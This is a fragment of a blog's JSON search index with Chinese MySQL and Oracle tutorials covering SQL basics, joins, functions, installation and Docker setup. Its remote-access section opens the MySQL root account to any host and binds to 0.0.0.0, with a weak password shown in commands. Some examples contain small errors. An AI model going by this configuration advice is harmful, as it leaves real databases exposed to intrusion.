--no-check-certificate","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"ubuntu卸载Mysql","slug":"ubuntu卸载Mysql","date":"2022-05-15T01:43:33.000Z","updated":"2022-05-15T01:43:46.807Z","comments":true,"path":"2022/05/15/ubuntu卸载Mysql/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/ubuntu卸载Mysql/","excerpt":"","text":"查看mysql依赖 1dpkg --list|grep mysql 卸载 mysql-common 12sudo apt-get remove mysql-commonsudo apt-get autoremove --purge mysql-server-5.0 查看是否剩下mysql+清除残留数据 12dpkg --list|grep mysqldpkg -l |grep ^rc|awk '&#123;print $2&#125;' |sudo xargs dpkg -P","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"mysql中文乱码问题","slug":"mysql中文乱码问题","date":"2022-05-14T20:01:30.000Z","updated":"2022-05-15T01:41:24.082Z","comments":true,"path":"2022/05/15/mysql中文乱码问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/mysql中文乱码问题/","excerpt":"","text":"MYSQL客户端的字符集 下面的测试均在test数据库中进行的: 实验步骤 使用两个linux客户端窗口, 一个用utf8登陆, 一个用gbk登陆 mysql数据库默认情况下是使用的utf8登陆的: 查看所有应用的字符集: 123456789101112131415show variables like &apos;character%&apos;; 执行结果: +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | utf8 | | character_set_connection | utf8 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | utf8 | | character_set_server | latin1 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 通过画图解释mysql的字符集问题: 客户端 ------ mysql服务端 ------ 数据库文件 1234character_set_clientcharacter_set_connection character_set_results 客户端使用的字符集, 都为utf8 1234此时执行: 在utf8字符集环境下插入数据: insert into mytest values(5, &apos;小胡&apos;); select * from mytest; ----正常显示 接下来开启另一个linux客户端, 使用gbk字符集进行登陆: 12345678910111213141516171819202122232425262728mysql -uroot -p123456 --default_character_set=gbk 切换到test用户下:查看所有应用的字符集: show variables like &apos;character%&apos;; +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | gbk | | character_set_connection | gbk | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | gbk | | character_set_server | latin1 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 此时客户端的字符集为: character_set_client character_set_connection character_set_results 都为gbk. select * from mytest: --不能正常显示 在gbk环境下插入, 然后再到utf8环境下去查看同样也不能正常显示中文. 总结: 1. 在utf8环境插入的中文不能用gbk查看; 2. 在gbk环境下插入的中文不能用utf8查看; 3. 在utf8环境下插入的中文要在utf8环境下查看; 在gbk环境下插入的中文要在gbk环境下查看. 2 操作系统的语言集 1234567891011121314151617181920212223242526272829cat /etc/sysconfig/i18n显示: LANG=&quot;zh_CN.UTF-8&quot; 操作系统的菜单按照zh_CN显示, 文件存储按照utf8 linux操作系统语言环境 和 用户的配置的语言环境LANG 相互影响echo $LANG -----&gt;zh_CN.UTF-8 修改用户下的.bash_profile 中的LANG，屏蔽操作系统的LANG设置或者export LANG=C临时设置也可以然后在登陆到mysql数据库上:登陆数据库: mysql -uroot -p123456 use test show variables like &apos;character%&apos; +--------------------------+----------------------------+ | Variable_name | Value | +--------------------------+----------------------------+ | character_set_client | latin1 | | character_set_connection | latin1 | | character_set_database | utf8 | | character_set_filesystem | binary | | character_set_results | latin1 | | character_set_server | latin1 | | character_set_system | utf8 | | character_sets_dir | /usr/share/mysql/charsets/ | +--------------------------+----------------------------+ 再次查看mytest表, 不能正常显示中文 select * from mytest; 3 linux客户端的字符集 若将linux客户端设置问GB18030, 则也会对中文的显示产生影响:","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"mysql表的约束","slug":"mysql表的约束","date":"2022-05-14T19:33:15.000Z","updated":"2022-05-14T19:38:04.545Z","comments":true,"path":"2022/05/15/mysql表的约束/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/mysql表的约束/","excerpt":"","text":"123456*定义主键约束 primary key: 不允许为空，不允许重复*定义主键自动增长 auto_increment*定义唯一约束 unique*定义非空约束 not null*定义外键约束 constraint ordersid_FK foreign key(ordersid) references orders(id)*删除主键：alter table tablename drop primary key ; 准备两个表:(下面的建表语句在执行的时候若不能正常执行, 可以尝试把tab去掉) 123456789101112create table class (id INT(11) primary key auto_increment,name varchar(20) unique);create table student (id INT(11) primary key auto_increment, name varchar(20) unique,passwd varchar(15) not null,classid INT(11),constraint stu_classid_FK foreign key(classid) references class(id)); 向class表中插入两条数据: 1234567insert into class(name) values(&apos;音乐&apos;);insert into class(name) values(&apos;体育&apos;);insert into class(id, name) values(5, &apos;美术&apos;);insert into class(name) values(&apos;文化&apos;);注意: 要插入的是部分列, 一定要在class表名后面写上列名, 表示要插入哪些列 由于class表的id是主键, 可以不用显示的插入主键的值, mysql会自动插入,而且会自动增长,确保不会重复. 向student表中插入数据: 123456789101112131415161718192021222324252627282930 正常插入一条记录: insert into student(name, passwd, classid) values(&apos;xiaohong&apos;, &apos;xxxxxx&apos;, 1);1 测试主键的非空性 insert into student(id, name, passwd, classid) values(null, &apos;xiaowen&apos;, &apos;xxxxxx&apos;, 1); 注意: 若给主键插入一个null, mysql会自动插入一个有效的值, 所以mysql的主键肯定不会为空 2 测试主键的唯一性约束 insert into student(id, name, passwd, classid) values(1, &apos;xiaoliu&apos;, &apos;xxxxxx&apos;, 1); -----&gt;ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;PRIMARY&apos; 3 测试name列的唯一性 insert into student(name, passwd, classid) values(&apos;xiaohong&apos;, &apos;xxxxxx&apos;, 2); -----&gt; ERROR 1062 (23000): Duplicate entry &apos;xiaohong&apos; for key &apos;name&apos; insert into student(name, passwd, classid) values(null, &apos;xxxxxx&apos;, 2); 注意: name为unique约束, 只是不能重复, 但是可以为空 4 测试passwd的非空约束 insert into student(name, passwd, classid) values(&apos;xiaohua&apos;, null, 2); -----&gt; ERROR 1048 (23000): Column &apos;passwd&apos; cannot be null 5 测试classid的外键约束 insert into student(name, passwd, classid) values(&apos;meizi&apos;, &apos;mmmm&apos;, 10); -----&gt;OREIGN KEY (`classid`) REFERENCES `class` (`id`)) 在class表中没有id为10的列的值.","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"mysql自连接","slug":"mysql自连接","date":"2022-05-14T19:23:37.000Z","updated":"2022-05-14T19:25:08.859Z","comments":true,"path":"2022/05/15/mysql自连接/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/mysql自连接/","excerpt":"","text":"自连接: 查询员工、老板信息，显示: xxx的老板是yyy 分析: 可以将emp表当成两个表来用, 一个是员工表 e, 一个是老板表 b 1 mysql不支持用||连接两个字符串 2 使用concat函数 12select concat(e.ename, &apos;的老板是&apos;, b.ename) from emp e, emp b where e.mgr=b.empno;select concat(e.ename, &apos;的老板是&apos;, b.ename) from emp e inner join emp b on e.mgr=b.empno; 3 若要显示KING的信息, 需要使用外连接 12345678a mysql不支持nvl函数b 使用ifnull函数左外连接:select concat(e.ename, &apos;的老板是&apos;, b.ename) from emp e left outer join emp b on e.mgr=b.empno;select concat(e.ename, &apos;的老板是&apos;, ifnull(b.ename, &apos;HIMSELF&apos;)) from emp e left outer join emp b on e.mgr=b.empno;右外连接:select concat(e.ename, &apos;的老板是&apos;, ifnull(b.ename, &apos;HIMSELF&apos;)) from emp b right outer join emp e on e.mgr=b.empno; ​","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"多表查询","slug":"多表查询","date":"2022-05-14T19:05:24.000Z","updated":"2022-05-14T19:10:21.615Z","comments":true,"path":"2022/05/15/多表查询/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/多表查询/","excerpt":"","text":"执行sql脚本 123source 脚本名.sqlsource scott_data.sql 2 交叉连接—相当于笛卡尔积 1select e.*, d.* from emp e cross join dept d; 3 自连接 123456789101112查询emp表和dept表的所有信息: SQL99: select e.*, d.* from emp e inner join dept d on e.deptno=d.deptno; 其中inner可以省略 oracle写法: select e.*, d.* from emp e, dept d where e.deptno=d.deptno; 总结: [,]----&gt;[inner join] [where]-----&gt;[on] 注意: 不能显示40号部门的信息, 此时需要使用外连接 4 外连接 123456789 左外连接: select e.*, d.* from emp e right outer join dept d on e.deptno=d.deptno; 右外连接: select e.*, d.* from dept d left outer join emp e on e.deptno=d.deptno; 【注意】SQL99中，外链接取值与关系表达式=号左右位置无关。取值跟from后表的书写顺序有关。 &quot;xxx left outer join yyy&quot; 则为取出xxx的内容。 &quot;xxx right outer join yyy&quot; 则为取出yyy的内容 对比练习: 1 查询员工信息,员工号,姓名,月薪,部门名称 123456select e.empno, e.ename, e.sal, d.dname from emp e inner join dept d on e.deptno=d.deptno;select e.empno, e.ename, e.sal, d.dname from emp e, dept d where e.deptno=d.deptno;[,] ----&gt;inner join[where] -----&gt;on 2 统计各个部门员工总人数-要求显示部门名称 123456789101112131415161718192021select d.deptno, d.dname, count(e.empno) from emp e inner join dept d on e.deptno=d.deptno group by d.deptno, d.dname; select d.deptno, d.dname, count(e.empno) from emp e, dept d where e.deptno=d.deptno group by d.deptno, d.dname; 显示40号部门的信息----需要使用外连接oracle的写法: ----不支持 select d.deptno, d.dname, count(e.empno) from emp e, dept d where e.deptno(+)=d.deptno group by d.deptno; ---不支持此种写法 外连接: 右外连接: select d.deptno, d.dname, count(e.empno) from emp e right outer join dept d on e.deptno=d.deptno group by d.deptno, d.dname; 左外连接: SELECT d.deptno, d.dname, COUNT(e.empno) FROM dept d LEFT OUTER JOIN emp e ON e.deptno=d.deptno GROUP BY d.deptno, d.dname; 与oracle比较: mysql不支持oracle那样的外连接的写法, 需要使用right | left [outer] join 的写法 ,----&gt;right|left [outer] join where----&gt;on","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"字符串相关函数","slug":"字符串相关函数","date":"2022-05-14T18:47:46.000Z","updated":"2022-05-14T18:49:19.141Z","comments":true,"path":"2022/05/15/字符串相关函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/字符串相关函数/","excerpt":"","text":"123select concat(&apos;hello &apos;, &apos;mysql &apos;, &apos;haha &apos;, &apos;hehe &apos;) from dual; Oracle默认只能拼两个，如需多个拼接可以使用嵌套。select &apos;hello &apos; || &apos;mysql &apos; from dual; ‘||’ 在 MySQL不可以使用。 1234567891011日期转字符串： 在MySQL中没有to_date函数，进行日期转换需使用date_format()来代替。 select date_format(&apos;2013-5-11&apos;, &apos;yyyy-mm-dd&apos;) from dual; 在Oracle中的‘yyyy-mm-dd’MySQL下不支持。 select date_format(now(), &apos;%Y-%m-%d&apos;) from dual; y和Y不一样。 select date_format(now(), &apos;%Y-%c-%d %h:%i:%s&apos;) from dual; c和m、M不一样 所以yyyy-mm-dd hh24:mi:ss格式在MySQL中对应&apos;%Y-%c-%d %h:%i:%s&apos; 字符串转日期： select str_to_date(&apos;2013-6-04 05:14:15&apos; , &apos;%Y-%c-%d %h:%i:%s&apos;) from dual;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"数学函数","slug":"数学函数","date":"2022-05-14T18:46:35.000Z","updated":"2022-05-14T18:47:01.305Z","comments":true,"path":"2022/05/15/数学函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/数学函数/","excerpt":"","text":"","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"日期时间函数","slug":"日期时间函数","date":"2022-05-14T18:27:29.000Z","updated":"2022-05-14T18:43:42.866Z","comments":true,"path":"2022/05/15/日期时间函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/日期时间函数/","excerpt":"","text":"MySQL里面时间分为三类：时间、日期、时间戳(含有时分秒的sysdate)。 如执行：select now(), year(now()) 年, month(now()) 月, day(now()) 日, date(now()); 1select CURRENT_DATE() , CURRENT_TIME(), CURRENT_TIMESTAMP() from dual; 昨天、今天、明天： 1select now()-1 昨天, now() 今天, now()+1 明天 from dual; ​ 发现与Oracle中的日期加减操作有所不同。 1234567select date_add(now(), INTERVAL 2 year) from dual; //增加两年select date_add(now(), INTERVAL -1 day) 昨天, now() 今天, date_add(now(), INTERVAL +1 day) 明天; select date_add(now(), interval -1 day) 昨天, date, date_add(now(), interval +1 day) 明天;注意: 上述语句中的函数名, INTERVAL不区分大小写, day, month, year也可以用大写.","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"mysql查询综合练习","slug":"mysql查询综合练习","date":"2022-05-14T17:52:02.000Z","updated":"2022-05-14T18:26:21.856Z","comments":true,"path":"2022/05/15/mysql查询综合练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/mysql查询综合练习/","excerpt":"","text":"创建一个学生表，插入数据 123456789101112131415161718create table student(id int,name varchar(20),chinese int,english int,math int);insert into student(id,name,chinese,english,math) values(1, &apos;范建&apos;,80,85,90);insert into student(id,name,chinese,english,math) values(2,&apos;罗况&apos;,90,95,95);insert into student(id,name,chinese,english,math) values(3,&apos;杜子腾&apos;,80,96,96);insert into student(id,name,chinese,english,math) values(4,&apos;范冰&apos;,81,97,85);insert into student(id,name,chinese,english,math) values(5,&apos;申晶冰&apos;,85,84,90);insert into student(id,name,chinese,english,math) values(6,&apos;郝丽海&apos;,92,85,87);insert into student(id,name,chinese,english,math) values(7,&apos;郭迪辉&apos;,75,81,80);insert into student(id,name,chinese,english,math) values(8,&apos;拎壶冲&apos;,77,80,79);insert into student(id,name,chinese,english,math) values(9,&apos;任我行&apos;,95,85,85);insert into student(id,name,chinese,english,math) values(10,&apos;史泰香&apos;,94,85,84); 查询表中所有学生的信息 1select * from student; 查询表中所有学生的姓名和对应的英语成绩。 1select name,english from student; 过滤表中重复数据 123456select english from student;select DISTINCT english from student;select DISTINCT english,name from student;select english+chinese+math from student;select english+chinese+math as 总分 from student;select name,english+chinese+math as 总分 from student; 在所有学生英语分数上加10分特长分。 1select name,english+10 from student; 统计每个学生的总分。 1select english+chinese+math from student; 使用别名表示学生分数 12select name,english+chinese+math as 总分 from student;select name,english+chinese+math 总分 from student; 查询姓名为何东的学生成绩 1select * from student where name=&apos;何东&apos;; 查询英语成绩大于90分的同学 1select * from student where english&gt;90; 查询总分大于250分的所有同学 1select * from student where english+chinese+math&gt;250; 查询英语分数在 85－95之间的同学。 12select * from student where english&gt;=85 and english&lt;=95;select * from student where english between 85 and 95; 查询数学分数为84,90,91的同学。 12select * from student where math=84 or math=90 or math=91;select * from student where math in(84,90,91); 查询所有姓何的学生成绩。 1select * from student where name like &apos;何%&apos;; 查询数学分&gt;85，语文分&gt;90的同学。 1select * from student where math&gt;85 and chinese&gt;90; 对数学成绩排序后输出。 1select * from student order by math; 对总分排序后输出，然后再按从高到低的顺序输出 1select * from student order by math+chinese+english desc; 对姓何的学生成绩排序输出 12select * from student where name like &apos;何%&apos; order by math+chinese+english desc;select name, math+chinese+english from student where name like &apos;何%&apos; order by math+chinese+english desc; 统计一个班级共有多少学生？ 1select count(*) from student; 统计数学成绩大于90的学生有多少个？ 1select count(*) from student where math&gt;90; 统计总分大于250的人数有多少？ 1select count(*) from student where math+chinese+english&gt;250; 统计一个班级数学总成绩？ 1select sum(math) from student; 统计一个班级语文、英语、数学各科的总成绩 1select sum(math), sum(chinese), sum(english) from student; 统计一个班级语文、英语、数学的成绩总和 12select sum(math+chinese+english)from student;select sum(math)+sum(chinese)+sum(english) from student; 求一个班级数学平均分？ 1select avg(math) from student; 求一个班级总分平均分 12select avg(math+chinese+english)from student;select avg(math)+avg(chinese)+avg(english) from student; 求班级最高分和最低分 1select max(math+chinese+english),min(math+chinese+english) from student; top-N问题: 123456按math成绩从小大的排序, 求math成绩在5-8名的select * from student order by math limit 4, 4;limit后面的两个数字的意思: 第一个4: 表示要跳过前面几个 第二个4: 表示连续取几个. 分组数据 为学生表，增加一个班级列，练习分组查询。 123alter table student add column class_id int; 注意语法：Oracle中不能有“column”关键字，MySQL中有没有“column”都可以执行。 更新表： 123update student set class_id=1 where id&lt;=5;update student set class_id=2 where id&gt;5;(update student set class_id=2 where id between 6 and 10;) 查出各个班的总分，最高分。 1select class_id, sum(chinese+english+math) &quot;总成绩&quot;, max(chinese+english+math) &quot;最高分&quot; from student group by class_id; 求各个班级 英语的平均分： 1select classid, avg(english) from student group by class_id 如根据组函数的语法要求，将select后增加name列，而不加至group by 之后： 123select name, classid, avg(english)from student group by classid;会发现MySQL检查不出错误。相比Oracle数据库，MySQL分组检查不严格。select sum(math+chinese+english),max(math+chinese+english) from student group by class_id; 查询出班级总分大于1300分的班级ID 12345678select class_id from student group by class_id having sum(math+chinese+english)&gt;1300;select class_id from student where sum(math+chinese+english)&gt;1300 group by class_id ; 对于组函数的应用与Oracle类似，可以应用于Having中，但不能用于where子句中. select class_id, sum(chinese+english+math) &quot;总分&quot; from student group by class_id having 总分&gt;1300; 注意: having后面若是用&quot;总分&quot;不可以, 但是不加&quot;&quot;可以. 在oracle数据库中, having后面不可以使用别名, mysql可以使用别名(若是中文不要加&quot;&quot;)","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"mysql的基本操作","slug":"mysql的基本操作","date":"2022-05-14T01:11:33.000Z","updated":"2022-05-15T00:16:19.960Z","comments":true,"path":"2022/05/14/mysql的基本操作/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/14/mysql的基本操作/","excerpt":"","text":"1Query OK //代表执行成功 1库名和表名是区分大小写的 数据库CURD 对数据库进行增(create)、删(delete)、改(update)、查(Retrieve)操作。 知识点补充: 介绍mysql数据库与oracle数据库的不同(图解说明) mysql数据库: root用户 &gt; 库 &gt; 表 oracle数据库: 数据库 &gt; 用户 &gt; 表 1“ ` ”（ESC键 下面的按键），表示反引号，默认情况下，反引号括起来的字符串，区分大小写。 1 创建数据库 12345创建数据库, 默认为latin1(拉丁)字符集的create database 库名;create database mydb1; 指定字符集为utf8 12create database 库名 character set 字符集;create database mydb2 character set utf8; 指定字符集为utf8,并对插入的数据进行检查是否是utf8字符集 123create database 库名 character set 字符集 collate 字符集_general_ci;create database mydb3 character set utf8 collate utf8_general_ci; 2 查看数据库 显示所有数据库 1show databases; 显示创建数据库的语句信息 12show create database 库名;show create database mydb1; 注意 ：mysql默认语言集是latin1，每次在创建数据库的时候应指定字符集. 3 修改数据库 1234修改mydb1的字符集为utf8(不能修改数据库名)alter database 库名 character set 字符集;alter database mydb1 character set utf8; 4 删除数据库 drop database 库名; drop database mydb1; 表的CURD 对表本身进行操作：创建，查看，修改，删除 1234567在创建表之前要先指定使用哪个库, 先查看一下有哪些库:查看有哪些库:show databases;使用指定的库:use 库名;use scott; 查看当前使用的是哪个库: 1status 或者 select database() from dual; 1234567891011bit 1位 可以指定位数，如：bit(3)int 2字节 可以指定最大位数，如：int&lt;4&gt; 最大为4位的整数float 2个字节 可以指定最大的位数和最大的小数位数，如：float&lt;5,2&gt; 最大为一个5位的数，小数位最多2位 double 4个字节 可以指定最大的位数和最大的小数位数，如：float&lt;6,4&gt; 最大为一个6位的数，小数位最多4位char 必须指定字符数,如char(5) 为不可变字符 即使存储的内容为&apos;ab&apos;,也是用5个字符的空间存储这个数据varchar 必须指定字符数,如varchar(5) 为可变字符 如果存储的内容为&apos;ab&apos;,占用2个字符的空间；如果为&apos;abc&apos;,则占用3个字符的空间text: 大文本(大字符串)blob： 二进制大数据 如图片，音频文件，视频文件date: 日期 如：&apos;1921-01-02&apos;datetime: 日期+时间 如：&apos;1921-01-02 12:23:43&apos;timeStamp: 时间戳，自动赋值为当前日期时间 1234567创建表常用到的数据类型: 常用的数据类型:intdoublechar varchartimestamp 1 创建表 123create table 表名(列名 类型, ..., 列名 类型, 列名 类型);create table employee(empno int, ename varchar(20), sal int); 2 查看表 1show tables; 查看表的创建语句 12show create table 表名;show create table emp; 查看表结构 12desc 表名;desc emp; 3 修改表 12345678910111213141516171819202122232425262728更改表名rename table 旧表名 to 新表名;rename table employee to worker; 增加一个字段alter table 表名 add column 列名 类型;alter table worker add column email varchar(30); 修改一个字段名 ALTER TABLE 表名 CHANGE [column] 旧字段名 新字段名 新数据类型; ALTER TABLE worker CHANGE [column] email ema varchar(50); 修改一个字段类型alter table 表名 modify column 列名 新类型;alter table worker modify column email varchar(50); 删除一个字段alter table 表名 drop column 要删除的列名;alter table worker drop column email; 修改表的字符集alter table 表名 character set 字符集;alter table worker character set utf8; 4 删除表 123drop table 表名;drop table worker;注意: mysql删除表不能使用purge 表数据的CURD 1 创建一个表 12345678910111213141516create table 表名( 列名 类型, 列名 类型, 列名 类型, 列名 类型 );create table employee( id int, name varchar(20), sex int, birthday date, salary double, entry_date date, resume text ); 注意: 若不能创建成功, 可以去掉建表语句中的tab键. 插入数据 123456789insert into 表名 values(值1,值2,...,值n); //插入全部列的数据insert into employee values(1,&apos;张三&apos;,1,&apos;1983-04-27&apos;,15000,&apos;2012-06-24&apos;,&apos;一个大牛&apos;);//插入指定列的数据insert into employee(列名1,列名2,列名3) values(值1,值2,值3);insert into employee(id,name,sex,birthday,salary,entry_date,resume) values(2,&apos;李四&apos;,1,&apos;1984-02-22&apos;,10000,&apos;2012-07-24&apos;,&apos;一个中牛&apos;);insert into employee(id,name,sex,birthday,salary,entry_date,resume) values(3,&apos;王五&apos;,0,&apos;1985-08-28&apos;,7000,&apos;2012-08-24&apos;,&apos;一个小虾&apos;); 2 查数据 12345678select 列名1,...,列名n from 表名;select id, name as &quot;名字&quot;, salary &quot;月薪&quot;, salary*12 年薪 from employee where id &gt;=2; select id, name as &quot;名字&quot;, salary &quot;月薪&quot;, salary*12 年薪 from employee where id &gt;=2 \\Gselect id, name as &quot;名字&quot;, salary &quot;月薪&quot;, salary*12 年薪 from employee where id &gt;=2 \\g 说明: 若表的列太多, 可以使用\\G或\\g 3 update数据 12345678update 表名 set 列名=值;将所有员工薪水都增加500元。update employee set salary=salary+500; 将王五的员工薪水修改为10000元，resume改为也是一个中牛update employee set salary=10000, resume=&apos;也是一个中牛&apos; where name=&apos;王五&apos;; 4 delete数据 1234567891011121314delete from 表名;delete from 表名 where 列名=值;truncate table 表名; //最好不要使用这一条sql语句,危险,删除后不可以恢复删除表中姓名为王五的记录。delete from employee where name=&apos;王五&apos;; 删除表中所有记录。delete from employee; 使用truncate删除表中记录。truncate table employee;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"MYSQL基础知识","slug":"MYSQL基础知识","date":"2022-05-13T21:24:27.000Z","updated":"2022-05-14T23:14:22.596Z","comments":true,"path":"2022/05/14/MYSQL基础知识/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/14/MYSQL基础知识/","excerpt":"","text":"mysql被oracle公司收购了. ​ 1234567mysql-essential-5.1.60-win32.msi 精简版，如果只需要mysql服务，就选择此版本。mysql-5.1.60-win32.msi 是完整版，包含安装程序和配置向导，有MySQL文档。 mysql-noinstall-5.1.60-win32.zip 是非安装的zip压缩包，没有自动安装程序和配置向导，无安装向导mysql-5.1.60.zip 是用于windows的Mysql源码压缩包 mysql版本: a Community社区版: 免费 b Enterprise企业版: 收费 1 MySQL标准版 2 MySQL企业版 3 MySQL集群版 每个版本又可以分为windows和linux版本, 再细分还可以分为32位和64位 mysql服务器的安装和卸载 1 查询服务器上已经按照的mysql版本: 1rpm -qa | grep mysql 2 卸载旧的版本 1rpm -e 软件包名 --nodeps --allmatches (不理会依赖关系，删除所有上一步查出来的相同的mysql) 3 删除一些卸载时未能删除的文件 #rm -f /etc/my.cnf #rm -rf /var/lib/mysql #rm -rf /var/share/mysql #rm -rf /usr/bin/mysql* 4 mysql的安装 解压 : 1unzip V46610-01-MySQL Database 5.6.20 RPM for Oracle Linux RHEL 6 x86 (64bit).zip 解压出来必须要安装的包: 123MySQL-client-advanced-5.6.20-1.el6.x86_64.rpmMySQL-devel-advanced-5.6.20-1.el6.x86_64.rpmMySQL-server-advanced-5.6.20-1.el6.x86_64.rpm 按照命令: 1rpm -ivh MySQL-server-advanced-5.6.****-1.el6.x86_64.rpm 安装完成之后密码的存放位置: /root/.mysql_secret 5 登陆mysql服务 a 用root身份启动mysql服务 1service mysql start b 查看mysql服务是否已经启动 12ps -u mysqlps -ef | grep mysql c 停止mysql服务 1service mysql stop d 登陆mysql服务 12345mysql -u 用户名 -pXXXX XXXX代表密码mysql -h 主机名 -P 端口号 -u 用户名 -pmysql -h 主机名 -P 端口号 -u 用户名 -p密码 1234567891011注意: 密码从/root/.mysql_secret文件中获取 登陆成功后, 修改密码: mysql&gt; set password=password(&apos;123456&apos;); //这个一般不使用了 ALTER USER &apos;用户名&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;密码&apos;; 一般使用这个修改密码 注意: 若无法正常登陆, 可以用root用户杀死mysql服务, 重新启动. 如何将oracle用户加入到sudo当中: 打开 /etc/sudoers, 添加oracle ALL=(ALL) ALL 5 退出登录 1quit/exit 安装客户端 12345#rpm -ivh MySQL-client-advanced-5.6.****-1.el6.x86_64.rpm说明:不安装mysql-client是不能使用mysql工具登陆到mysql数据库其他软件包选择性安装：#rpm -ivh MySQL-devel-advanced-5.6.20-1.el6.x86_64.rpm 远程访问不了数据库 在控制台输入 mysql -uroot -p密码 进入mysql 输入use mysql;进入mysql数据库 输入update user set host='%' where user='root' ; 来允许通过ip访问。 修改 /etc/mysql/mysql.conf.d/下的mysqld.cnf文件 将bind-address = 127.0.0.1改成bind-address =0.0.0.0 123428 #29 # Instead of skip-networking the default is now to listen only on30 # localhost which is more compatible and is not less secure.31 bind-address = 0.0.0.0","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"Docker拉取oracle 11g镜像配置的详细教程","slug":"Docker拉取oracle11g镜像配置的详细教程","date":"2022-05-12T22:22:30.000Z","updated":"2022-05-30T16:02:00.624Z","comments":true,"path":"2022/05/13/Docker拉取oracle11g镜像配置的详细教程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/13/Docker拉取oracle11g镜像配置的详细教程/","excerpt":"","text":"docker拉取oracle数据库镜像 1docker search oracle 查看可以使用docker拉取的oracle镜像；我是选择的Oracle12c这一款，truevoly/oracle-12c是复制之前的sath89/oracle-12c image镜像。 开始拉取镜像-执行命令： 1docker pull registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g 下载完成后 查看镜像： 1docker images 创建容器 1docker run -d -p 1521:1521 --name oracle11g registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g 参数 -d 后台运行容器，并返回容器ID ; -p 指定端口 , -v 指定数据卷位置 数据卷的特点： 1、可以供多个容器访问，直接共享或者重用 2、独立于容器周期，不会在删除容器时删除其挂载的数据卷 3、数据卷在容器启动时初始化，如果容器使用的镜像在挂载点包含的数据这些数据会复制到新的容器中 4、可以直接对数据卷里的内容进行修改 这里说一下，命令后面的地址一定要是你下载的镜像地址也就是你拉取镜像名字，否则会出现名字已存在等问题！ ​ 如果创建成功能会返回容器id 1ee92e88fea086c05af307d0274e1555ab04bfe747bb7b5b5e2198074bc40cdde 启动容器 1docker start oracle11g 进入镜像进行配置 1docker exec -it oracle11g bash 创建软连接 1ln -s $ORACLE_HOME/bin/sqlplus /usr/bin 1//ctrl + p + q 退出容器（注意，不要exit退出，防止容器直接关闭了） 查看容器运行状态 1docker ps -a 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESee92e88fea08 truevoly/oracle-12c &quot;/entrypoint.sh &quot; 6 minutes ago Up 6 minutes 0.0.0.0:1521-&gt;1521/tcp, :::1521-&gt;1521/tcp, 0.0.0.0:2122-&gt;22/tcp, :::2122-&gt;22/tcp, 0.0.0.0:9090-&gt;8080/tcp, :::9090-&gt;8080/tcp oracle12c//进入容器内部[root@localhost ~]# docker exec -it ee92e88fea08 /bin/bash//切换成oracle用户root@ee92e88fea08:/# su oracle//进入sqlplusoracle@ee92e88fea08:/$ $ORACLE_HOME/bin/sqlplus / as sysdbaSQL*Plus: Release 12.1.0.2.0 Production on Sun Aug 1 03:15:37 2021Copyright (c) 1982, 2014, Oracle. All rights reserved.Connected to:Oracle Database 12c Standard Edition Release 12.1.0.2.0 - 64bit Production//设置密码有效期为无限制SQL&gt; ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;Profile altered.//解锁system用户SQL&gt; alter user SYSTEM account unlock;User altered.//创建一个账号为test_lx的用户密码设置为test_lxSQL&gt; create user test_lx identified by test_lx; User created.//为这个用户赋予管理员的权限SQL&gt; grant dba to test_lx;Grant succeeded.SQL&gt; read escape sequence//ctrl + p + q 